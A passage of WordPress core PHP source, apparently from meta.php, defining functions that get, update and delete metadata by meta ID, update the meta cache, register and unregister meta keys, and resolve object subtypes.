	$check = apply_filters( "get_{$meta_type}_metadata", null, $object_id, $meta_key, true, $meta_type );
	if ( null !== $check ) {
		return (bool) $check;
	}

	$meta_cache = wp_cache_get( $object_id, $meta_type . '_meta' );

	if ( ! $meta_cache ) {
		$meta_cache = update_meta_cache( $meta_type, array( $object_id ) );
		$meta_cache = $meta_cache[ $object_id ];
	}

	if ( isset( $meta_cache[ $meta_key ] ) ) {
		return true;
	}

	return false;
}

/**
 * Retrieves metadata by meta ID.
 *
 * @since 3.3.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $meta_type Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                          or any other object type with an associated meta table.
 * @param int    $meta_id   ID for a specific meta row.
 * @return stdClass|false {
 *     Metadata object, or boolean `false` if the metadata doesn't exist.
 *
 *     @type string $meta_key   The meta key.
 *     @type mixed  $meta_value The unserialized meta value.
 *     @type string $meta_id    Optional. The meta ID when the meta type is any value except 'user'.
 *     @type string $umeta_id   Optional. The meta ID when the meta type is 'user'.
 *     @type string $post_id    Optional. The object ID when the meta type is 'post'.
 *     @type string $comment_id Optional. The object ID when the meta type is 'comment'.
 *     @type string $term_id    Optional. The object ID when the meta type is 'term'.
 *     @type string $user_id    Optional. The object ID when the meta type is 'user'.
 * }
 */
function get_metadata_by_mid( $meta_type, $meta_id ) {
	global $wpdb;

	if ( ! $meta_type || ! is_numeric( $meta_id ) || floor( $meta_id ) != $meta_id ) {
		return false;
	}

	$meta_id = (int) $meta_id;
	if ( $meta_id <= 0 ) {
		return false;
	}

	$table = _get_meta_table( $meta_type );
	if ( ! $table ) {
		return false;
	}

	/**
	 * Short-circuits the return value when fetching a meta field by meta ID.
	 *
	 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
	 * (post, comment, term, user, or any other type with an associated meta table).
	 * Returning a non-null value will effectively short-circuit the function.
	 *
	 * @since 5.0.0
	 *
	 * @param stdClass|null $value   The value to return.
	 * @param int           $meta_id Meta ID.
	 */
	$check = apply_filters( "get_{$meta_type}_metadata_by_mid", null, $meta_id );
	if ( null !== $check ) {
		return $check;
	}

	$id_column = ( 'user' === $meta_type ) ? 'umeta_id' : 'meta_id';

	$meta = $wpdb->get_row( $wpdb->prepare( "SELECT * FROM $table WHERE $id_column = %d", $meta_id ) );

	if ( empty( $meta ) ) {
		return false;
	}

	if ( isset( $meta->meta_value ) ) {
		$meta->meta_value = maybe_unserialize( $meta->meta_value );
	}

	return $meta;
}

/**
 * Updates metadata by meta ID.
 *
 * @since 3.3.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string       $meta_type  Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                                 or any other object type with an associated meta table.
 * @param int          $meta_id    ID for a specific meta row.
 * @param string       $meta_value Metadata value. Must be serializable if non-scalar.
 * @param string|false $meta_key   Optional. You can provide a meta key to update it. Default false.
 * @return bool True on successful update, false on failure.
 */
function update_metadata_by_mid( $meta_type, $meta_id, $meta_value, $meta_key = false ) {
	global $wpdb;

	// Make sure everything is valid.
	if ( ! $meta_type || ! is_numeric( $meta_id ) || floor( $meta_id ) != $meta_id ) {
		return false;
	}

	$meta_id = (int) $meta_id;
	if ( $meta_id <= 0 ) {
		return false;
	}

	$table = _get_meta_table( $meta_type );
	if ( ! $table ) {
		return false;
	}

	$column    = sanitize_key( $meta_type . '_id' );
	$id_column = ( 'user' === $meta_type ) ? 'umeta_id' : 'meta_id';

	/**
	 * Short-circuits updating metadata of a specific type by meta ID.
	 *
	 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
	 * (post, comment, term, user, or any other type with an associated meta table).
	 * Returning a non-null value will effectively short-circuit the function.
	 *
	 * @since 5.0.0
	 *
	 * @param null|bool    $check      Whether to allow updating metadata for the given type.
	 * @param int          $meta_id    Meta ID.
	 * @param mixed        $meta_value Meta value. Must be serializable if non-scalar.
	 * @param string|false $meta_key   Meta key, if provided.
	 */
	$check = apply_filters( "update_{$meta_type}_metadata_by_mid", null, $meta_id, $meta_value, $meta_key );
	if ( null !== $check ) {
		return (bool) $check;
	}

	// Fetch the meta and go on if it's found.
	$meta = get_metadata_by_mid( $meta_type, $meta_id );
	if ( $meta ) {
		$original_key = $meta->meta_key;
		$object_id    = $meta->{$column};

		// If a new meta_key (last parameter) was specified, change the meta key,
		// otherwise use the original key in the update statement.
		if ( false === $meta_key ) {
			$meta_key = $original_key;
		} elseif ( ! is_string( $meta_key ) ) {
			return false;
		}

		$meta_subtype = get_object_subtype( $meta_type, $object_id );

		// Sanitize the meta.
		$_meta_value = $meta_value;
		$meta_value  = sanitize_meta( $meta_key, $meta_value, $meta_type, $meta_subtype );
		$meta_value  = maybe_serialize( $meta_value );

		// Format the data query arguments.
		$data = array(
			'meta_key'   => $meta_key,
			'meta_value' => $meta_value,
		);

		// Format the where query arguments.
		$where               = array();
		$where[ $id_column ] = $meta_id;

		/** This action is documented in wp-includes/meta.php */
		do_action( "update_{$meta_type}_meta", $meta_id, $object_id, $meta_key, $_meta_value );

		if ( 'post' === $meta_type ) {
			/** This action is documented in wp-includes/meta.php */
			do_action( 'update_postmeta', $meta_id, $object_id, $meta_key, $meta_value );
		}

		// Run the update query, all fields in $data are %s, $where is a %d.
		$result = $wpdb->update( $table, $data, $where, '%s', '%d' );
		if ( ! $result ) {
			return false;
		}

		// Clear the caches.
		wp_cache_delete( $object_id, $meta_type . '_meta' );

		/** This action is documented in wp-includes/meta.php */
		do_action( "updated_{$meta_type}_meta", $meta_id, $object_id, $meta_key, $_meta_value );

		if ( 'post' === $meta_type ) {
			/** This action is documented in wp-includes/meta.php */
			do_action( 'updated_postmeta', $meta_id, $object_id, $meta_key, $meta_value );
		}

		return true;
	}

	// And if the meta was not found.
	return false;
}

/**
 * Deletes metadata by meta ID.
 *
 * @since 3.3.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $meta_type Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                          or any other object type with an associated meta table.
 * @param int    $meta_id   ID for a specific meta row.
 * @return bool True on successful delete, false on failure.
 */
function delete_metadata_by_mid( $meta_type, $meta_id ) {
	global $wpdb;

	// Make sure everything is valid.
	if ( ! $meta_type || ! is_numeric( $meta_id ) || floor( $meta_id ) != $meta_id ) {
		return false;
	}

	$meta_id = (int) $meta_id;
	if ( $meta_id <= 0 ) {
		return false;
	}

	$table = _get_meta_table( $meta_type );
	if ( ! $table ) {
		return false;
	}

	// Object and ID columns.
	$column    = sanitize_key( $meta_type . '_id' );
	$id_column = ( 'user' === $meta_type ) ? 'umeta_id' : 'meta_id';

	/**
	 * Short-circuits deleting metadata of a specific type by meta ID.
	 *
	 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
	 * (post, comment, term, user, or any other type with an associated meta table).
	 * Returning a non-null value will effectively short-circuit the function.
	 *
	 * @since 5.0.0
	 *
	 * @param null|bool $delete  Whether to allow metadata deletion of the given type.
	 * @param int       $meta_id Meta ID.
	 */
	$check = apply_filters( "delete_{$meta_type}_metadata_by_mid", null, $meta_id );
	if ( null !== $check ) {
		return (bool) $check;
	}

	// Fetch the meta and go on if it's found.
	$meta = get_metadata_by_mid( $meta_type, $meta_id );
	if ( $meta ) {
		$object_id = (int) $meta->{$column};

		/** This action is documented in wp-includes/meta.php */
		do_action( "delete_{$meta_type}_meta", (array) $meta_id, $object_id, $meta->meta_key, $meta->meta_value );

		// Old-style action.
		if ( 'post' === $meta_type || 'comment' === $meta_type ) {
			/**
			 * Fires immediately before deleting post or comment metadata of a specific type.
			 *
			 * The dynamic portion of the hook, `$meta_type`, refers to the meta
			 * object type (post or comment).
			 *
			 * @since 3.4.0
			 *
			 * @param int $meta_id ID of the metadata entry to delete.
			 */
			do_action( "delete_{$meta_type}meta", $meta_id );
		}

		// Run the query, will return true if deleted, false otherwise.
		$result = (bool) $wpdb->delete( $table, array( $id_column => $meta_id ) );

		// Clear the caches.
		wp_cache_delete( $object_id, $meta_type . '_meta' );

		/** This action is documented in wp-includes/meta.php */
		do_action( "deleted_{$meta_type}_meta", (array) $meta_id, $object_id, $meta->meta_key, $meta->meta_value );

		// Old-style action.
		if ( 'post' === $meta_type || 'comment' === $meta_type ) {
			/**
			 * Fires immediately after deleting post or comment metadata of a specific type.
			 *
			 * The dynamic portion of the hook, `$meta_type`, refers to the meta
			 * object type (post or comment).
			 *
			 * @since 3.4.0
			 *
			 * @param int $meta_ids Deleted metadata entry ID.
			 */
			do_action( "deleted_{$meta_type}meta", $meta_id );
		}

		return $result;

	}

	// Meta ID was not found.
	return false;
}

/**
 * Updates the metadata cache for the specified objects.
 *
 * @since 2.9.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string       $meta_type  Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                                 or any other object type with an associated meta table.
 * @param string|int[] $object_ids Array or comma delimited list of object IDs to update cache for.
 * @return array|false Metadata cache for the specified objects, or false on failure.
 */
function update_meta_cache( $meta_type, $object_ids ) {
	global $wpdb;

	if ( ! $meta_type || ! $object_ids ) {
		return false;
	}

	$table = _get_meta_table( $meta_type );
	if ( ! $table ) {
		return false;
	}

	$column = sanitize_key( $meta_type . '_id' );

	if ( ! is_array( $object_ids ) ) {
		$object_ids = preg_replace( '|[^0-9,]|', '', $object_ids );
		$object_ids = explode( ',', $object_ids );
	}

	$object_ids = array_map( 'intval', $object_ids );

	/**
	 * Short-circuits updating the metadata cache of a specific type.
	 *
	 * The dynamic portion of the hook, `$meta_type`, refers to the meta object type
	 * (post, comment, term, user, or any other type with an associated meta table).
	 * Returning a non-null value will effectively short-circuit the function.
	 *
	 * @since 5.0.0
	 *
	 * @param mixed $check      Whether to allow updating the meta cache of the given type.
	 * @param int[] $object_ids Array of object IDs to update the meta cache for.
	 */
	$check = apply_filters( "update_{$meta_type}_metadata_cache", null, $object_ids );
	if ( null !== $check ) {
		return (bool) $check;
	}

	$cache_key      = $meta_type . '_meta';
	$non_cached_ids = array();
	$cache          = array();
	$cache_values   = wp_cache_get_multiple( $object_ids, $cache_key );

	foreach ( $cache_values as $id => $cached_object ) {
		if ( false === $cached_object ) {
			$non_cached_ids[] = $id;
		} else {
			$cache[ $id ] = $cached_object;
		}
	}

	if ( empty( $non_cached_ids ) ) {
		return $cache;
	}

	// Get meta info.
	$id_list   = implode( ',', $non_cached_ids );
	$id_column = ( 'user' === $meta_type ) ? 'umeta_id' : 'meta_id';

	$meta_list = $wpdb->get_results( "SELECT $column, meta_key, meta_value FROM $table WHERE $column IN ($id_list) ORDER BY $id_column ASC", ARRAY_A );

	if ( ! empty( $meta_list ) ) {
		foreach ( $meta_list as $metarow ) {
			$mpid = (int) $metarow[ $column ];
			$mkey = $metarow['meta_key'];
			$mval = $metarow['meta_value'];

			// Force subkeys to be array type.
			if ( ! isset( $cache[ $mpid ] ) || ! is_array( $cache[ $mpid ] ) ) {
				$cache[ $mpid ] = array();
			}
			if ( ! isset( $cache[ $mpid ][ $mkey ] ) || ! is_array( $cache[ $mpid ][ $mkey ] ) ) {
				$cache[ $mpid ][ $mkey ] = array();
			}

			// Add a value to the current pid/key.
			$cache[ $mpid ][ $mkey ][] = $mval;
		}
	}

	foreach ( $non_cached_ids as $id ) {
		if ( ! isset( $cache[ $id ] ) ) {
			$cache[ $id ] = array();
		}
		wp_cache_add( $id, $cache[ $id ], $cache_key );
	}

	return $cache;
}

/**
 * Retrieves the queue for lazy-loading metadata.
 *
 * @since 4.5.0
 *
 * @return WP_Metadata_Lazyloader Metadata lazyloader queue.
 */
function wp_metadata_lazyloader() {
	static $wp_metadata_lazyloader;

	if ( null === $wp_metadata_lazyloader ) {
		$wp_metadata_lazyloader = new WP_Metadata_Lazyloader();
	}

	return $wp_metadata_lazyloader;
}

/**
 * Given a meta query, generates SQL clauses to be appended to a main query.
 *
 * @since 3.2.0
 *
 * @see WP_Meta_Query
 *
 * @param array  $meta_query        A meta query.
 * @param string $type              Type of meta.
 * @param string $primary_table     Primary database table name.
 * @param string $primary_id_column Primary ID column name.
 * @param object $context           Optional. The main query object
 * @return array Associative array of `JOIN` and `WHERE` SQL.
 */
function get_meta_sql( $meta_query, $type, $primary_table, $primary_id_column, $context = null ) {
	$meta_query_obj = new WP_Meta_Query( $meta_query );
	return $meta_query_obj->get_sql( $type, $primary_table, $primary_id_column, $context );
}

/**
 * Retrieves the name of the metadata table for the specified object type.
 *
 * @since 2.9.0
 *
 * @global wpdb $wpdb WordPress database abstraction object.
 *
 * @param string $type Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                     or any other object type with an associated meta table.
 * @return string|false Metadata table name, or false if no metadata table exists
 */
function _get_meta_table( $type ) {
	global $wpdb;

	$table_name = $type . 'meta';

	if ( empty( $wpdb->$table_name ) ) {
		return false;
	}

	return $wpdb->$table_name;
}

/**
 * Determines whether a meta key is considered protected.
 *
 * @since 3.1.3
 *
 * @param string $meta_key  Metadata key.
 * @param string $meta_type Optional. Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                          or any other object type with an associated meta table. Default empty.
 * @return bool Whether the meta key is considered protected.
 */
function is_protected_meta( $meta_key, $meta_type = '' ) {
	$sanitized_key = preg_replace( "/[^\x20-\x7E\p{L}]/", '', $meta_key );
	$protected     = strlen( $sanitized_key ) > 0 && ( '_' === $sanitized_key[0] );

	/**
	 * Filters whether a meta key is considered protected.
	 *
	 * @since 3.2.0
	 *
	 * @param bool   $protected Whether the key is considered protected.
	 * @param string $meta_key  Metadata key.
	 * @param string $meta_type Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
	 *                          or any other object type with an associated meta table.
	 */
	return apply_filters( 'is_protected_meta', $protected, $meta_key, $meta_type );
}

/**
 * Sanitizes meta value.
 *
 * @since 3.1.3
 * @since 4.9.8 The `$object_subtype` parameter was added.
 *
 * @param string $meta_key       Metadata key.
 * @param mixed  $meta_value     Metadata value to sanitize.
 * @param string $object_type    Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                               or any other object type with an associated meta table.
 * @param string $object_subtype Optional. The subtype of the object type.
 * @return mixed Sanitized $meta_value.
 */
function sanitize_meta( $meta_key, $meta_value, $object_type, $object_subtype = '' ) {
	if ( ! empty( $object_subtype ) && has_filter( "sanitize_{$object_type}_meta_{$meta_key}_for_{$object_subtype}" ) ) {

		/**
		 * Filters the sanitization of a specific meta key of a specific meta type and subtype.
		 *
		 * The dynamic portions of the hook name, `$object_type`, `$meta_key`,
		 * and `$object_subtype`, refer to the metadata object type (comment, post, term, or user),
		 * the meta key value, and the object subtype respectively.
		 *
		 * @since 4.9.8
		 *
		 * @param mixed  $meta_value     Metadata value to sanitize.
		 * @param string $meta_key       Metadata key.
		 * @param string $object_type    Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
		 *                               or any other object type with an associated meta table.
		 * @param string $object_subtype Object subtype.
		 */
		return apply_filters( "sanitize_{$object_type}_meta_{$meta_key}_for_{$object_subtype}", $meta_value, $meta_key, $object_type, $object_subtype );
	}

	/**
	 * Filters the sanitization of a specific meta key of a specific meta type.
	 *
	 * The dynamic portions of the hook name, `$meta_type`, and `$meta_key`,
	 * refer to the metadata object type (comment, post, term, or user) and the meta
	 * key value, respectively.
	 *
	 * @since 3.3.0
	 *
	 * @param mixed  $meta_value  Metadata value to sanitize.
	 * @param string $meta_key    Metadata key.
	 * @param string $object_type Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
	 *                            or any other object type with an associated meta table.
	 */
	return apply_filters( "sanitize_{$object_type}_meta_{$meta_key}", $meta_value, $meta_key, $object_type );
}

/**
 * Registers a meta key.
 *
 * It is recommended to register meta keys for a specific combination of object type and object subtype. If passing
 * an object subtype is omitted, the meta key will be registered for the entire object type, however it can be partly
 * overridden in case a more specific meta key of the same name exists for the same object type and a subtype.
 *
 * If an object type does not support any subtypes, such as users or comments, you should commonly call this function
 * without passing a subtype.
 *
 * @since 3.3.0
 * @since 4.6.0 {@link https://core.trac.wordpress.org/ticket/35658 Modified
 *              to support an array of data to attach to registered meta keys}. Previous arguments for
 *              `$sanitize_callback` and `$auth_callback` have been folded into this array.
 * @since 4.9.8 The `$object_subtype` argument was added to the arguments array.
 * @since 5.3.0 Valid meta types expanded to include "array" and "object".
 * @since 5.5.0 The `$default` argument was added to the arguments array.
 *
 * @param string       $object_type Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                                  or any other object type with an associated meta table.
 * @param string       $meta_key    Meta key to register.
 * @param array        $args {
 *     Data used to describe the meta key when registered.
 *
 *     @type string     $object_subtype    A subtype; e.g. if the object type is "post", the post type. If left empty,
 *                                         the meta key will be registered on the entire object type. Default empty.
 *     @type string     $type              The type of data associated with this meta key.
 *                                         Valid values are 'string', 'boolean', 'integer', 'number', 'array', and 'object'.
 *     @type string     $description       A description of the data attached to this meta key.
 *     @type bool       $single            Whether the meta key has one value per object, or an array of values per object.
 *     @type mixed      $default           The default value returned from get_metadata() if no value has been set yet.
 *                                         When using a non-single meta key, the default value is for the first entry.
 *                                         In other words, when calling get_metadata() with `$single` set to `false`,
 *                                         the default value given here will be wrapped in an array.
 *     @type callable   $sanitize_callback A function or method to call when sanitizing `$meta_key` data.
 *     @type callable   $auth_callback     Optional. A function or method to call when performing edit_post_meta,
 *                                         add_post_meta, and delete_post_meta capability checks.
 *     @type bool|array $show_in_rest      Whether data associated with this meta key can be considered public and
 *                                         should be accessible via the REST API. A custom post type must also declare
 *                                         support for custom fields for registered meta to be accessible via REST.
 *                                         When registering complex meta values this argument may optionally be an
 *                                         array with 'schema' or 'prepare_callback' keys instead of a boolean.
 * }
 * @param string|array $deprecated Deprecated. Use `$args` instead.
 * @return bool True if the meta key was successfully registered in the global array, false if not.
 *              Registering a meta key with distinct sanitize and auth callbacks will fire those callbacks,
 *              but will not add to the global registry.
 */
function register_meta( $object_type, $meta_key, $args, $deprecated = null ) {
	global $wp_meta_keys;

	if ( ! is_array( $wp_meta_keys ) ) {
		$wp_meta_keys = array();
	}

	$defaults = array(
		'object_subtype'    => '',
		'type'              => 'string',
		'description'       => '',
		'default'           => '',
		'single'            => false,
		'sanitize_callback' => null,
		'auth_callback'     => null,
		'show_in_rest'      => false,
	);

	// There used to be individual args for sanitize and auth callbacks.
	$has_old_sanitize_cb = false;
	$has_old_auth_cb     = false;

	if ( is_callable( $args ) ) {
		$args = array(
			'sanitize_callback' => $args,
		);

		$has_old_sanitize_cb = true;
	} else {
		$args = (array) $args;
	}

	if ( is_callable( $deprecated ) ) {
		$args['auth_callback'] = $deprecated;
		$has_old_auth_cb       = true;
	}

	/**
	 * Filters the registration arguments when registering meta.
	 *
	 * @since 4.6.0
	 *
	 * @param array  $args        Array of meta registration arguments.
	 * @param array  $defaults    Array of default arguments.
	 * @param string $object_type Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
	 *                            or any other object type with an associated meta table.
	 * @param string $meta_key    Meta key.
	 */
	$args = apply_filters( 'register_meta_args', $args, $defaults, $object_type, $meta_key );
	unset( $defaults['default'] );
	$args = wp_parse_args( $args, $defaults );

	// Require an item schema when registering array meta.
	if ( false !== $args['show_in_rest'] && 'array' === $args['type'] ) {
		if ( ! is_array( $args['show_in_rest'] ) || ! isset( $args['show_in_rest']['schema']['items'] ) ) {
			_doing_it_wrong( __FUNCTION__, __( 'When registering an "array" meta type to show in the REST API, you must specify the schema for each array item in "show_in_rest.schema.items".' ), '5.3.0' );

			return false;
		}
	}

	$object_subtype = ! empty( $args['object_subtype'] ) ? $args['object_subtype'] : '';

	// If `auth_callback` is not provided, fall back to `is_protected_meta()`.
	if ( empty( $args['auth_callback'] ) ) {
		if ( is_protected_meta( $meta_key, $object_type ) ) {
			$args['auth_callback'] = '__return_false';
		} else {
			$args['auth_callback'] = '__return_true';
		}
	}

	// Back-compat: old sanitize and auth callbacks are applied to all of an object type.
	if ( is_callable( $args['sanitize_callback'] ) ) {
		if ( ! empty( $object_subtype ) ) {
			add_filter( "sanitize_{$object_type}_meta_{$meta_key}_for_{$object_subtype}", $args['sanitize_callback'], 10, 4 );
		} else {
			add_filter( "sanitize_{$object_type}_meta_{$meta_key}", $args['sanitize_callback'], 10, 3 );
		}
	}

	if ( is_callable( $args['auth_callback'] ) ) {
		if ( ! empty( $object_subtype ) ) {
			add_filter( "auth_{$object_type}_meta_{$meta_key}_for_{$object_subtype}", $args['auth_callback'], 10, 6 );
		} else {
			add_filter( "auth_{$object_type}_meta_{$meta_key}", $args['auth_callback'], 10, 6 );
		}
	}

	if ( array_key_exists( 'default', $args ) ) {
		$schema = $args;
		if ( is_array( $args['show_in_rest'] ) && isset( $args['show_in_rest']['schema'] ) ) {
			$schema = array_merge( $schema, $args['show_in_rest']['schema'] );
		}

		$check = rest_validate_value_from_schema( $args['default'], $schema );
		if ( is_wp_error( $check ) ) {
			_doing_it_wrong( __FUNCTION__, __( 'When registering a default meta value the data must match the type provided.' ), '5.5.0' );

			return false;
		}

		if ( ! has_filter( "default_{$object_type}_metadata", 'filter_default_metadata' ) ) {
			add_filter( "default_{$object_type}_metadata", 'filter_default_metadata', 10, 5 );
		}
	}

	// Global registry only contains meta keys registered with the array of arguments added in 4.6.0.
	if ( ! $has_old_auth_cb && ! $has_old_sanitize_cb ) {
		unset( $args['object_subtype'] );

		$wp_meta_keys[ $object_type ][ $object_subtype ][ $meta_key ] = $args;

		return true;
	}

	return false;
}

/**
 * Filters into default_{$object_type}_metadata and adds in default value.
 *
 * @since 5.5.0
 *
 * @param mixed  $value     Current value passed to filter.
 * @param int    $object_id ID of the object metadata is for.
 * @param string $meta_key  Metadata key.
 * @param bool   $single    If true, return only the first value of the specified meta_key.
 *                          This parameter has no effect if meta_key is not specified.
 * @param string $meta_type Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                          or any other object type with an associated meta table.
 * @return mixed Single metadata default, or array of defaults.
 */
function filter_default_metadata( $value, $object_id, $meta_key, $single, $meta_type ) {
	global $wp_meta_keys;

	if ( wp_installing() ) {
		return $value;
	}

	if ( ! is_array( $wp_meta_keys ) || ! isset( $wp_meta_keys[ $meta_type ] ) ) {
		return $value;
	}

	$defaults = array();
	foreach ( $wp_meta_keys[ $meta_type ] as $sub_type => $meta_data ) {
		foreach ( $meta_data as $_meta_key => $args ) {
			if ( $_meta_key === $meta_key && array_key_exists( 'default', $args ) ) {
				$defaults[ $sub_type ] = $args;
			}
		}
	}

	if ( ! $defaults ) {
		return $value;
	}

	// If this meta type does not have subtypes, then the default is keyed as an empty string.
	if ( isset( $defaults[''] ) ) {
		$metadata = $defaults[''];
	} else {
		$sub_type = get_object_subtype( $meta_type, $object_id );
		if ( ! isset( $defaults[ $sub_type ] ) ) {
			return $value;
		}
		$metadata = $defaults[ $sub_type ];
	}

	if ( $single ) {
		$value = $metadata['default'];
	} else {
		$value = array( $metadata['default'] );
	}

	return $value;
}

/**
 * Checks if a meta key is registered.
 *
 * @since 4.6.0
 * @since 4.9.8 The `$object_subtype` parameter was added.
 *
 * @param string $object_type    Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                               or any other object type with an associated meta table.
 * @param string $meta_key       Metadata key.
 * @param string $object_subtype Optional. The subtype of the object type.
 * @return bool True if the meta key is registered to the object type and, if provided,
 *              the object subtype. False if not.
 */
function registered_meta_key_exists( $object_type, $meta_key, $object_subtype = '' ) {
	$meta_keys = get_registered_meta_keys( $object_type, $object_subtype );

	return isset( $meta_keys[ $meta_key ] );
}

/**
 * Unregisters a meta key from the list of registered keys.
 *
 * @since 4.6.0
 * @since 4.9.8 The `$object_subtype` parameter was added.
 *
 * @param string $object_type    Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                               or any other object type with an associated meta table.
 * @param string $meta_key       Metadata key.
 * @param string $object_subtype Optional. The subtype of the object type.
 * @return bool True if successful. False if the meta key was not registered.
 */
function unregister_meta_key( $object_type, $meta_key, $object_subtype = '' ) {
	global $wp_meta_keys;

	if ( ! registered_meta_key_exists( $object_type, $meta_key, $object_subtype ) ) {
		return false;
	}

	$args = $wp_meta_keys[ $object_type ][ $object_subtype ][ $meta_key ];

	if ( isset( $args['sanitize_callback'] ) && is_callable( $args['sanitize_callback'] ) ) {
		if ( ! empty( $object_subtype ) ) {
			remove_filter( "sanitize_{$object_type}_meta_{$meta_key}_for_{$object_subtype}", $args['sanitize_callback'] );
		} else {
			remove_filter( "sanitize_{$object_type}_meta_{$meta_key}", $args['sanitize_callback'] );
		}
	}

	if ( isset( $args['auth_callback'] ) && is_callable( $args['auth_callback'] ) ) {
		if ( ! empty( $object_subtype ) ) {
			remove_filter( "auth_{$object_type}_meta_{$meta_key}_for_{$object_subtype}", $args['auth_callback'] );
		} else {
			remove_filter( "auth_{$object_type}_meta_{$meta_key}", $args['auth_callback'] );
		}
	}

	unset( $wp_meta_keys[ $object_type ][ $object_subtype ][ $meta_key ] );

	// Do some clean up.
	if ( empty( $wp_meta_keys[ $object_type ][ $object_subtype ] ) ) {
		unset( $wp_meta_keys[ $object_type ][ $object_subtype ] );
	}
	if ( empty( $wp_meta_keys[ $object_type ] ) ) {
		unset( $wp_meta_keys[ $object_type ] );
	}

	return true;
}

/**
 * Retrieves a list of registered meta keys for an object type.
 *
 * @since 4.6.0
 * @since 4.9.8 The `$object_subtype` parameter was added.
 *
 * @param string $object_type    Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                               or any other object type with an associated meta table.
 * @param string $object_subtype Optional. The subtype of the object type.
 * @return string[] List of registered meta keys.
 */
function get_registered_meta_keys( $object_type, $object_subtype = '' ) {
	global $wp_meta_keys;

	if ( ! is_array( $wp_meta_keys ) || ! isset( $wp_meta_keys[ $object_type ] ) || ! isset( $wp_meta_keys[ $object_type ][ $object_subtype ] ) ) {
		return array();
	}

	return $wp_meta_keys[ $object_type ][ $object_subtype ];
}

/**
 * Retrieves registered metadata for a specified object.
 *
 * The results include both meta that is registered specifically for the
 * object's subtype and meta that is registered for the entire object type.
 *
 * @since 4.6.0
 *
 * @param string $object_type Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                            or any other object type with an associated meta table.
 * @param int    $object_id   ID of the object the metadata is for.
 * @param string $meta_key    Optional. Registered metadata key. If not specified, retrieve all registered
 *                            metadata for the specified object.
 * @return mixed A single value or array of values for a key if specified. An array of all registered keys
 *               and values for an object ID if not. False if a given $meta_key is not registered.
 */
function get_registered_metadata( $object_type, $object_id, $meta_key = '' ) {
	$object_subtype = get_object_subtype( $object_type, $object_id );

	if ( ! empty( $meta_key ) ) {
		if ( ! empty( $object_subtype ) && ! registered_meta_key_exists( $object_type, $meta_key, $object_subtype ) ) {
			$object_subtype = '';
		}

		if ( ! registered_meta_key_exists( $object_type, $meta_key, $object_subtype ) ) {
			return false;
		}

		$meta_keys     = get_registered_meta_keys( $object_type, $object_subtype );
		$meta_key_data = $meta_keys[ $meta_key ];

		$data = get_metadata( $object_type, $object_id, $meta_key, $meta_key_data['single'] );

		return $data;
	}

	$data = get_metadata( $object_type, $object_id );
	if ( ! $data ) {
		return array();
	}

	$meta_keys = get_registered_meta_keys( $object_type );
	if ( ! empty( $object_subtype ) ) {
		$meta_keys = array_merge( $meta_keys, get_registered_meta_keys( $object_type, $object_subtype ) );
	}

	return array_intersect_key( $data, $meta_keys );
}

/**
 * Filters out `register_meta()` args based on an allowed list.
 *
 * `register_meta()` args may change over time, so requiring the allowed list
 * to be explicitly turned off is a warranty seal of sorts.
 *
 * @access private
 * @since 5.5.0
 *
 * @param array $args         Arguments from `register_meta()`.
 * @param array $default_args Default arguments for `register_meta()`.
 * @return array Filtered arguments.
 */
function _wp_register_meta_args_allowed_list( $args, $default_args ) {
	return array_intersect_key( $args, $default_args );
}

/**
 * Returns the object subtype for a given object ID of a specific type.
 *
 * @since 4.9.8
 *
 * @param string $object_type Type of object metadata is for. Accepts 'post', 'comment', 'term', 'user',
 *                            or any other object type with an associated meta table.
 * @param int    $object_id   ID of the object to retrieve its subtype.
 * @return string The object subtype or an empty string if unspecified subtype.
 */
function get_object_subtype( $object_type, $object_id ) {
	$object_id      = (int) $object_id;
	$object_subtype = '';

	switch ( $object_type ) {
		case 'post':
			$post_type = get_post_type( $object_id );

			if ( ! empty( $post_type ) ) {
				$object_subtype = $post_type;
			}
			break;

		case 'term':
			$term = get_term( $object_id );
			if ( ! $term instanceof WP_Term ) {
				break;
			}

			$object_subtype = $term->taxonomy;
			break;

		case 'comment':
			$comment = get_comment( $object_id );
			if ( ! $comment ) {
				break;
			}

			$object_subtype = 'comment';
			break;

		case 'user':
			$user = get_user_by( 'id', $object_id );
			if ( ! $user ) {
				break;
			}

			$object_subtype = 'user';
			break;
	}

	/**
	 * Filters the object subtype identifier for a non-standard object type.
	 *
	 * The dynamic portion of the hook, `$object_type`, refers to the meta object type
	 * (post, comment, term, user, or any other type with an associated meta table).
	 *
	 * @since 4.9.8
	 *
	 * @param string $object_subtype Empty string to override.
	 * @param int    $object_id      ID of the object to get the subtype for.
	 */
	return apply_filters( "get_object_subtype_{$object_type}", $object_subtype, $object_id );
}
